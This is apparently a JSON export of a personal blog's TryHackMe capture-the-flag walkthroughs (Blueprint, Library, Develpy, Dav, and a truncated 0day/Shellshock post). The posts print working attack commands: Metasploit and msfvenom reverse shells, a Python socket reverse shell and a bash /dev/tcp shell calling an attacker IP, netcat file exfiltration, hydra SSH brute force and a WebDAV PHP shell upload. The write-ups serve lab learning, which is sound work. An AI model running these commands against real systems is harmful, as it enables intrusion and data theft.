oscommerce-2.3.4/catalog/ | - 2019-04-11 22:52 oscommerce-2.3.4/docs/ |_ | http-methods: |_ Potentially risky methods: TRACE 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2s, deviation: 1s, median: 1s | smb-os-discovery: | OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1 | Computer name: BLUEPRINT | NetBIOS computer name: BLUEPRINT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-02-28T17:35:00+00:00 |_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:b8:60:4f:ba:87 (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2024-02-28T17:35:00 |_ start_date: 2024-02-28T17:27:12 | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . It is using osCommerce 2.3.4 - public exploit is available for this version - https://www.exploit-db.com/exploits/44374\nroot flag Instead of using the exploit directly, I used Metasploit framework.\nStart by searching the exploit.\nset options and then run the exploit, and boom, it will give you Metasploit shell.\nNow as we got the shell, navigate to the administrator desktop and cat the root file.\n1 2 3 4 meterpreter \u0026gt; pwd C:\\Users\\Administrator\\Desktop meterpreter \u0026gt; cat root.txt.txt THM{aea1e3ce6fe7f89e10cea833ae009bee} Hashdump Now we have php shell, which is useless to get the hashdump. It will give you error when running hashdump in that shell.\n1 2 meterpreter \u0026gt; hashdump [-] The \u0026#34;hashdump\u0026#34; command requires the \u0026#34;priv\u0026#34; extension to be loaded (run: `load priv`) So what we need to do is escalate php shell into window’s shell. To do so, I have found a blog which seems to bee very helpful - https://dl.packetstormsecurity.net/papers/attack/root3.pdf and https://sckull.github.io/posts/blueprint/\nAccording to the blog, firstly generate the payload using msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=1338 -f exe \u0026gt; payload.exe\nThen move to system folder (cd c:\\\\windows\\\\system32) and upload the payload into php shell using upload payload.exe.\nOpen a new msfconsole and then use the following command to start window's shell.\n1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost tun0 set lport 1338 exploit Now, execute the payload using execute -f payload.exe on php shell and boom, we got the window’s shell.\nThis are the hashes\n1 2 3 Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: Atlast, we can use crackstation website to crack the hash.\n","description":"Hack into this Windows machine and escalate your privileges to Administrator.","id":21,"section":"posts","tags":["TryHackMe","Meterpreter","CVE"],"title":"TryHackMe Writeup - Blueprint Room","uri":"https://g4nd1v.github.io/posts/tryhackme-blueprint/"},{"content":" Title https://tryhackme.com/room/bsidesgtlibrary Description boot2root machine for FIT and bsides guatemala CTF Difficulty Easy Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 └─$ nmap -sC -sV -oA nmap/library 10.10.157.19 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 11:55 EST Nmap scan report for 10.10.157.19 Host is up (0.10s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA) | 256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA) |_ 256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Welcome to Blog - Library Machine |_http-server-header: Apache/2.4.18 (Ubuntu) | http-robots.txt: 1 disallowed entry |_/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds So, there are 2 ports that are open. ssh and http. It doesnot seem to contain CVE in apache version for remote code execution.\nNext, I tried to get directories using gobuster and tried to find subdomain using ffuf , but nothing showed interesting results.\nuser flag There are 2 things that is giving some hints. Firstly, in comments of the blog, it seems to have the usernames i.e. root , www-data , meliodas , and Anonymous. Moreover, in robots.txt there is a word rockyou. So maybe I thought bruteforce SSH using hydra?\nVoila, we got the password for SSH.\n1 2 3 4 └─$ hydra -L names.txt -P /usr/share/wordlists/rockyou.txt 10.10.157.19 ssh Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). ... [22][ssh] host: 10.10.157.19 login: meliodas password: iloveyou1 root flag Upon doing sudo -l we found there is a file which we can use as sudo.\n1 2 3 4 5 6 meliodas@ubuntu:~$ sudo -l Matching Defaults entries for meliodas on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User meliodas may run the following commands on ubuntu: (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py This is the content of the file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 meliodas@ubuntu:~$ cat bak.py #!/usr/bin/env python import os import zipfile def zipdir(path, ziph): for root, dirs, files in os.walk(path): for file in files: ziph.write(os.path.join(root, file)) if __name__ == \u0026#39;__main__\u0026#39;: zipf = zipfile.ZipFile(\u0026#39;/var/backups/website.zip\u0026#39;, \u0026#39;w\u0026#39;, zipfile.ZIP_DEFLATED) zipdir(\u0026#39;/var/www/html\u0026#39;, zipf) zipf.close() Here is the file structure.\n1 2 3 4 5 6 7 8 9 10 11 12 13 meliodas@ubuntu:~$ ls -al total 40 drwxr-xr-x 4 meliodas meliodas 4096 Aug 24 2019 . drwxr-xr-x 3 root root 4096 Aug 23 2019 .. -rw-r--r-- 1 root root 353 Aug 23 2019 bak.py -rw------- 1 root root 44 Aug 23 2019 .bash_history -rw-r--r-- 1 meliodas meliodas 220 Aug 23 2019 .bash_logout -rw-r--r-- 1 meliodas meliodas 3771 Aug 23 2019 .bashrc drwx------ 2 meliodas meliodas 4096 Aug 23 2019 .cache drwxrwxr-x 2 meliodas meliodas 4096 Aug 23 2019 .nano -rw-r--r-- 1 meliodas meliodas 655 Aug 23 2019 .profile -rw-r--r-- 1 meliodas meliodas 0 Aug 23 2019 .sudo_as_admin_successful -rw-rw-r-- 1 meliodas meliodas 33 Aug 23 2019 user.txt Simple Solution is to remove the bak.py file and create new file and write shell there to and run it as sudo to get the root.\n1 2 3 4 5 6 meliodas@ubuntu:~$ mv bak.py bak.py.bk meliodas@ubuntu:~$ vi bak.py meliodas@ubuntu:~$ echo \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt; bak.py meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py root@ubuntu:~# cat /root/root.txt e8c8c6c256c35515d1d344ee0488c617 root flag - Method #2 echo $PATH - it is using meliodas directory in the path, so we can create our rev shell in place of the library which is using in the program like zipfile.\nMore detailed explanation for Python-Library-Hijacking - https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/\n1 2 meliodas@ubuntu:~$ echo $PATH /home/meliodas/bin:/home/meliodas/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games On server\n1 2 3 4 5 6 7 meliodas@ubuntu:~$ vi zipfile.py meliodas@ubuntu:~$ cat zipfile.py import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.8.95.227\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); meliodas@ubuntu:~$ ls bak.py user.txt zipfile.py zipfile.pyc meliodas@ubuntu:~$ sudo python3 /home/meliodas/bak.py \u0026lt;active shell connection\u0026gt; On Client\n1 2 3 4 5 6 7 8 9 10 11 12 13 └─$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.8.95.227] from (UNKNOWN) [10.10.157.19] 50962 # whoami root # ls bak.py __pycache__ user.txt zipfile.py zipfile.pyc # cat /root/root.txt e8c8c6c256c35515d1d344ee0488c617 ","description":"boot2root machine for FIT and bsides guatemala CTF","id":22,"section":"posts","tags":["TryHackMe","Hydra","Python-Library-Hijacking"],"title":"TryHackMe Writeup - Library Room","uri":"https://g4nd1v.github.io/posts/tryhackme-library/"},{"content":" Title https://tryhackme.com/room/bsidesgtdevelpy Description boot2root machine for FIT and bsides Guatemala CTF Difficulty Medium Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 └─$ nmap 10.10.224.39 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 18:52 EST Nmap scan report for 10.10.224.39 Host is up (0.096s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 10000/tcp open snet-sensor-mgmt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 └─$ nmap -n -sV --script \u0026#34;ndmp-fs-info\u0026#34; -p 10000 10.10.224.39 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 18:55 EST Stats: 0:01:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Stats: 0:01:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Nmap scan report for 10.10.224.39 Host is up (0.093s latency). PORT STATE SERVICE VERSION 10000/tcp open snet-sensor-mgmt? | fingerprint-strings: | GenericLines: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 0 | SyntaxError: unexpected EOF while parsing | GetRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;GET\u0026#39; is not defined | HTTPOptions, RTSPRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;OPTIONS\u0026#39; is not defined | NULL: | Private 0days |_ Please enther number of exploits to send??: So python service is running at port 10000 we can connect using nc.\n1 2 3 4 5 6 7 8 └─$ nc 10.10.224.39 10000 Private 0days Please enther number of exploits to send??: 1 Exploit started, attacking target (tryhackme.com)... Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.064 ms Maybe a pyjail? I don’t know, let’s try!\nuser flag Bypass Python sandboxes\nVoila, it worked!\n1 2 3 4 5 6 7 8 └─$ nc 10.10.224.39 10000 Private 0days Please enther number of exploits to send??: __builtins__.__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;) credentials.png exploit.py root.sh run.sh user.txt Exploit started, attacking target (tryhackme.com)... 1 2 3 4 5 6 7 8 ─$ nc 10.10.224.39 10000 Private 0days Please enther number of exploits to send??: __builtins__.__import__(\u0026#34;os\u0026#34;).system(\u0026#34;cat user.txt\u0026#34;) cf85ff769cfaaa721758949bf870b019 Exploit started, attacking target (tryhackme.com)... Connecting with rev bash shell,\nroot flag use this to get the rev shell - **builtins**.**import**(\u0026quot;os\u0026quot;).system(\u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.95.227/4444 0\u0026gt;\u0026amp;1'\u0026quot;)\nWe will get the shell as king user.\nThere is a file named as credentials.png , now we have to download using nc.\n1 2 3 4 5 On your machine nc -l -p 1234 -q 1 \u0026gt; credentials.png \u0026lt; /dev/null On King\u0026#39;s machine cat credentials.png | netcat 10.8.95.227 1234 well, it does not seem like png file. I cannot be able to crack it. (Yes yes, later I have checked writeup for it!) — it was piet programming (https://www.bertnase.de/npiet/). Anyway…\nHere, we can able to read file and delete it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 king@ubuntu:~$ ls -al ls -al total 324 drwxr-xr-x 4 king king 4096 Aug 27 2019 . drwxr-xr-x 3 root root 4096 Aug 25 2019 .. -rw------- 1 root root 2929 Aug 27 2019 .bash_history -rw-r--r-- 1 king king 220 Aug 25 2019 .bash_logout -rw-r--r-- 1 king king 3771 Aug 25 2019 .bashrc drwx------ 2 king king 4096 Aug 25 2019 .cache -rwxrwxrwx 1 king king 272113 Aug 27 2019 credentials.png -rwxrwxrwx 1 king king 408 Aug 25 2019 exploit.py drwxrwxr-x 2 king king 4096 Aug 25 2019 .nano -rw-rw-r-- 1 king king 5 Feb 23 17:12 .pid -rw-r--r-- 1 king king 655 Aug 25 2019 .profile -rw-r--r-- 1 root root 32 Aug 25 2019 root.sh -rw-rw-r-- 1 king king 139 Aug 25 2019 run.sh -rw-r--r-- 1 king king 0 Aug 25 2019 .sudo_as_admin_successful -rw-rw-r-- 1 king king 33 Aug 27 2019 user.txt -rw-r--r-- 1 root root 183 Aug 25 2019 .wget-hsts Next thing is remove the [root.sh](http://root.sh) file and then create a new file and add reverse shell in that file.\nAnd boom we for the root!\n1 2 3 4 root@ubuntu:/home/king# cat /root/root.txt cat /root/root.txt 9c37646777a53910a347f387dce025ec root@ubuntu:/home/king# ","description":"boot2root machine for FIT and bsides Guatemala CTF","id":23,"section":"posts","tags":["TryHackMe","pyjail","cronjob"],"title":"TryHackMe Writeup - Develpy Room","uri":"https://g4nd1v.github.io/posts/tryhackme-develpy/"},{"content":" Title https://tryhackme.com/room/bsidesgtdav Description boot2root machine for FIT and bsides guatemala CTF Difficulty Easy Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 9 10 11 └─$ nmap -sC -sV -oA nmap/dav 10.10.88.48 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 18:51 EST Nmap scan report for 10.10.88.48 Host is up (0.10s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . So basically only one port is open, that is 80 .\nAlso, on this port there is a default page of apache2.\nNext logical step will be to search for directories.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 └─$ gobuster dir -u 10.10.88.48 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.88.48 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 290] /.htaccess (Status: 403) [Size: 295] /.htpasswd (Status: 403) [Size: 295] /index.html (Status: 200) [Size: 11321] /server-status (Status: 403) [Size: 299] /webdav (Status: 401) [Size: 458] We found a directory named as /webdav but it is asking for username and password.\nAfter searching through internet about webdav, I found default credentials - https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html\nuser: wampp\npass: xampp\nUser flag I found a file passwd.dav on server and in that file, I found this credentials\nwampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91 but I cannot be able to crack it.\nI found a blog which is about exploiting webdav - https://vk9-sec.com/exploiting-webdav/ and uploading the rev shell using php.\n1 2 3 4 5 6 7 8 └─$ cadaver http://10.10.188.137/webdav Authentication required for webdav on server `10.10.188.137\u0026#39;: Username: wampp Password: dav:/webdav/\u0026gt; ls Listing collection `/webdav/\u0026#39;: succeeded. passwd.dav 44 Aug 25 2019 dav:/webdav/\u0026gt; put php-reverse-shell.php On visiting the website, we got the shell!!\n1 2 3 4 5 6 7 8 9 10 11 $ whoami www-data $ cd /home $ ls merlin wampp $ cd merlin $ ls user.txt $ cat user.txt 449b40fe93f78a938523b7e4dcd66d2a Root flag we can use /bin/cat as sudo user.\n1 2 3 4 5 6 7 8 www-data@ubuntu:/home/merlin$ sudo -l sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: /bin/cat Here is the /etc/shadow file and I have tried to use john in order to crack this hash. But it is of no use. Then I remember… we have cat as root.\nSimply reading root file will also work!\n1 2 3 www-data@ubuntu:/$ sudo cat /root/root.txt sudo cat /root/root.txt 101101ddc16b0cdf65ba0b8a7af7afa5 ","description":"boot2root machine for FIT and bsides guatemala CTF","id":24,"section":"posts","tags":["TryHackMe","Apache","Webdav"],"title":"TryHackMe Writeup - Dav Room","uri":"https://g4nd1v.github.io/posts/tryhackme-dav/"},{"content":"I am Krishnan Navadia (g4nd1v), a passionate cybersecurity enthusiast and software developer based in NYC, USA. Currently pursuing a Master\u0026rsquo;s degree in Cybersecurity at New York University, I have a strong foundation in Information Technology from G.H. Patel College of Engineering and Technology, India.\nFeel free to reach out to me via email or connect on LinkedIn. You can also check out my projects on GitHub.\n","description":"Krishnan Navadia's profile showcasing his experience, projects, and achievements.","id":25,"section":"","tags":null,"title":"About Me","uri":"https://g4nd1v.github.io/about/"},{"content":"0day Title 0day Description Exploit Ubuntu, like a Turtle in a Hurricane Difficulty Medium Maker 0day Foothold 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 5720823c62aa8f4223c0b893996f499c (DSA) | 2048 4c40db32640d110cef4fb85b739bc76b (RSA) | 256 f76f78d58352a64dda213c5547b72d6d (ECDSA) |_ 256 a5b4f084b6a78deb0a9d3e7437336516 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: 0day |_http-server-header: Apache/2.4.7 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From nmap, we didn\u0026rsquo;t find anything interesting, therefore let\u0026rsquo;s find the directories.\n└──╼ $gobuster dir -u 0day.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://0day.thm [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/06/12 15:51:58 Starting gobuster in directory enumeration mode =============================================================== /cgi-bin (Status: 301) [Size: 305] [--\u0026gt; http://0day.thm/cgi-bin/] /img (Status: 301) [Size: 301] [--\u0026gt; http://0day.thm/img/] /uploads (Status: 301) [Size: 305] [--\u0026gt; http://0day.thm/uploads/] /admin (Status: 301) [Size: 303] [--\u0026gt; http://0day.thm/admin/] /css (Status: 301) [Size: 301] [--\u0026gt; http://0day.thm/css/] /js (Status: 301) [Size: 300] [--\u0026gt; http://0day.thm/js/] /backup (Status: 301) [Size: 304] [--\u0026gt; http://0day.thm/backup/] /secret (Status: 301) [Size: 304] [--\u0026gt; http://0day.thm/secret/] ... /cgi-bin (Status: 301) [Size: 305] [--\u0026gt; http://0day.thm/cgi-bin/] ... We get private RSA from /backup, let\u0026rsquo;s crack it using john.\n-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547 T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8 9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g /5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB 6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6 8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6 oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE 99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P -----END RSA PRIVATE KEY----- └──╼ $python2 /usr/share/john/ssh2john.py ./rsa_private_key \u0026gt; rsa.hash └──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt ./rsa.hash ... letmein (./rsa_private_key) Then I tried to login with ssh, but I can\u0026rsquo;t. Damm it! It\u0026rsquo;s a rabbit hole.\nI am clueless now, maybe Nikto scan can help.\n└──╼ $nikto -h 0day.thm - Nikto v2.1.5 --------------------------------------------------------------------------- + Target IP: 10.10.152.56 + Target Hostname: 0day.thm + Target Port: 80 + Start Time: 2023-06-12 16:08:31 (GMT5.5) --------------------------------------------------------------------------- + Server: Apache/2.4.7 (Ubuntu) + Server leaks inodes via ETags, header found with file /, fields: 0xbd1 0x5ae57bb9a1192 + The anti-clickjacking X-Frame-Options header is not present. + \u0026#34;robots.txt\u0026#34; retrieved but it does not contain any \u0026#39;disallow\u0026#39; entries (which is odd). + Allowed HTTP Methods: OPTIONS, GET, HEAD, POST + OSVDB-3092: /admin/: This might be interesting... + OSVDB-3092: /backup/: This might be interesting... + OSVDB-3268: /img/: Directory indexing found. + OSVDB-3092: /img/: This might be interesting... + OSVDB-3092: /secret/: This might be interesting... + OSVDB-3092: /cgi-bin/test.cgi: This might be interesting... ... We have checked other files, but this test.cgi is new, after checking that endpoint, in a response it said Hello World!, huh, weird.\nAfter searching on Hacktricks I tried to test it using nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 └──╼ $nmap 0day.thm -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 16:21 IST Nmap scan report for 0day.thm (10.10.152.56) Host is up (0.18s latency). PORT STATE SERVICE 80/tcp open http | http-shellshock: | VULNERABLE: | HTTP Shellshock vulnerability | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2014-6271 | This web application might be affected by the vulnerability known | as Shellshock. It seems the server is executing commands injected | via malicious HTTP headers. | | Disclosure date: 2014-09-24 | References: | http://seclists.org/oss-sec/2014/q3/685 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | http://www.openwall.com/lists/oss-security/2014/09/24/10 |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169 Now, we metasploit exploit to get the shell.\nuser flag using metasploit we can shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search shellshock # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/advantech_switch_bash_env_exec 2015-12-01 excellent Yes Advantech Switch Bash Environment Variable Code Injection (Shellshock) 1 exploit/multi/http/apache_mod_cgi_bash_env_exec 2014-09-24 excellent Yes Apache mod_cgi Bash Environment Variable Code Injection (Shellshock) 2 auxiliary/scanner/http/apache_mod_cgi_bash_env 2014-09-24 normal Yes Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner ... results ... [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use 1 [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set rhosts 0day.thm rhosts =\u0026gt; 0day.thm [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set targeturi /cgi-bin/test.cgi targeturi =\u0026gt; /cgi-bin/test.cgi [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; show payloads ... results ... 27 payload/linux/x86/shell/reverse_tcp normal No Linux Command Shell, Reverse TCP Stager [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set payload 27 payload =\u0026gt; linux/x86/shell/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set lhost 10.8.95.227 lhost =\u0026gt; 10.8.95.227 [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; show options Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec): Name Current Setting Required Description ---- --------------- -------- ----------- CMD_MAX_LENGTH 2048 yes CMD max line length CVE CVE-2014-6271 yes CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278) HEADER User-Agent yes HTTP header to use METHOD GET yes HTTP method to use Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 0day.thm yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPATH /bin yes Target PATH for binaries used by the CmdStager RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI /cgi-bin/test.cgi yes Path to CGI script TIMEOUT 5 yes HTTP read response timeout (seconds) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 